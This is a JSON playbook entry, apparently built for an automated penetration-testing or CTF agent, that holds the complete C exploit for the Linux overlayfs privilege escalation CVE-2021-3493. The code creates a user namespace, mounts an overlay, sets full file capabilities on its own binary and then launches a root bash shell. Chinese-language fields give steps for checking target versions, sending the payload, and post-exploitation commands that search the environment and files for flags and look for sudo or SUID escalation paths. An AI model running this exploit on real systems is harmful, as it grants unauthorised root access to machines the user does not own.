{"id": "awesome-poc:cve-2021-3493:2", "kind": "poc", "title": "Linux kernel 权限提升漏洞 CVE-2021-3493", "technique": "unknown", "summary": "操作系统漏洞 / CVE-2021-3493。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2021-3493 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["操作系统漏洞", "CVE-2021-3493"], "payload_template": "#define _GNU_SOURCE\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <err.h>\n#include <errno.h>\n#include <sched.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <sys/wait.h>\n#include <sys/mount.h>\n\n//#include <attr/xattr.h>\n//#include <sys/xattr.h>\nint setxattr(const char *path, const char *name, const void *value, size_t size, int flags);\n\n\n#define DIR_BASE    \"./ovlcap\"\n#define DIR_WORK    DIR_BASE \"/work\"\n#define DIR_LOWER   DIR_BASE \"/lower\"\n#define DIR_UPPER   DIR_BASE \"/upper\"\n#define DIR_MERGE   DIR_BASE \"/merge\"\n#define BIN_MERGE   DIR_MERGE \"/magic\"\n#define BIN_UPPER   DIR_UPPER \"/magic\"\n\n\nstatic void xmkdir(const char *path, mode_t mode)\n{\n    if (mkdir(path, mode) == -1 && errno != EEXIST)\n        err(1, \"mkdir %s\", path);\n}\n\nstatic void xwritefile(const char *path, const char *data)\n{\n    int fd = open(path, O_WRONLY);\n    if (fd == -1)\n        err(1, \"open %s\", path);\n    ssize_t len = (ssize_t) strlen(data);\n    if (write(fd, data, len) != len)\n        err(1, \"write %s\", path);\n    close(fd);\n}\n\nstatic void xcopyfile(const char *src, const char *dst, mode_t mode)\n{\n    int fi, fo;\n\n    if ((fi = open(src, O_RDONLY)) == -1)\n        err(1, \"open %s\", src);\n    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)\n        err(1, \"open %s\", dst);\n\n    char buf[4096];\n    ssize_t rd, wr;\n\n    for (;;) {\n        rd = read(fi, buf, sizeof(buf));\n        if (rd == 0) {\n            break;\n        } else if (rd == -1) {\n            if (errno == EINTR)\n                continue;\n            err(1, \"read %s\", src);\n        }\n\n        char *p = buf;\n        while (rd > 0) {\n            wr = write(fo, p, rd);\n            if (wr == -1) {\n                if (errno == EINTR)\n                    continue;\n                err(1, \"write %s\", dst);\n            }\n            p += wr;\n            rd -= wr;\n        }\n    }\n\n    close(fi);\n    close(fo);\n}\n\nstatic int exploit()\n{\n    char buf[4096];\n\n    sprintf(buf, \"rm -rf '%s/'\", DIR_BASE);\n    system(buf);\n\n    xmkdir(DIR_BASE, 0777);\n    xmkdir(DIR_WORK,  0777);\n    xmkdir(DIR_LOWER, 0777);\n    xmkdir(DIR_UPPER, 0777);\n    xmkdir(DIR_MERGE, 0777);\n\n    uid_t uid = getuid();\n    gid_t gid = getgid();\n\n    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)\n        err(1, \"unshare\");\n\n    xwritefile(\"/proc/self/setgroups\", \"deny\");\n\n    sprintf(buf, \"0 %d 1\", uid);\n    xwritefile(\"/proc/self/uid_map\", buf);\n\n    sprintf(buf, \"0 %d 1\", gid);\n    xwritefile(\"/proc/self/gid_map\", buf);\n\n    sprintf(buf, \"lowerdir=%s,upperdir=%s,workdir=%s\", DIR_LOWER, DIR_UPPER, DIR_WORK);\n    if (mount(\"overlay\", DIR_MERGE, \"overlay\", 0, buf) == -1)\n        err(1, \"mount %s\", DIR_MERGE);\n\n    // all+ep\n    char cap[] = \"\\x01\\x00\\x00\\x02\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\";\n\n    xcopyfile(\"/proc/self/exe\", BIN_MERGE, 0777);\n    if (setxattr(BIN_MERGE, \"security.capability\", cap, sizeof(cap) - 1, 0) == -1)\n        err(1, \"setxattr %s\", BIN_MERGE);\n\n    return 0;\n}\n\nint main(int argc, char *argv[])\n{\n    if (strstr(argv[0], \"magic\") || (argc > 1 && !strcmp(argv[1], \"shell\"))) {\n        setuid(0);\n        setgid(0);\n        execl(\"/bin/bash\", \"/bin/bash\", \"--norc\", \"--noprofile\", \"-i\", NULL);\n        err(1, \"execl /bin/bash\");\n    }\n\n    pid_t child = fork();\n    if (child == -1)\n        err(1, \"fork\");\n\n    if (child == 0) {\n        _exit(exploit());\n    } else {\n        waitpid(child, NULL, 0);\n    }\n\n    execl(BIN_UPPER, BIN_UPPER, \"shell\", NULL);\n    err(1, \"execl %s\", BIN_UPPER);\n}", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2021-3493 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["先 `printenv | grep -i -e flag -e ctf` —— 进程环境是最快的来源。", "再 `ls -la /` 与 `grep -rIl -e 'CTF{' -e 'flag{' /var/www /tmp /opt 2>/dev/null` —— 文件名常不含 flag。", "全空就判断提权路径（`id`/`sudo -l`/SUID），无路可上就停止并报告，不要重复同一请求。"], "provenance": {"source_type": "reference-corpus", "source_ref": "awesome-poc", "source_url": "https://github.com/Threekiii/Awesome-POC", "notes": "提取自 操作系统漏洞/Linux kernel 权限提升漏洞 CVE-2021-3493.md 的复现段落"}, "trust_level": "unverified", "verified_solve": false, "published_at": null}
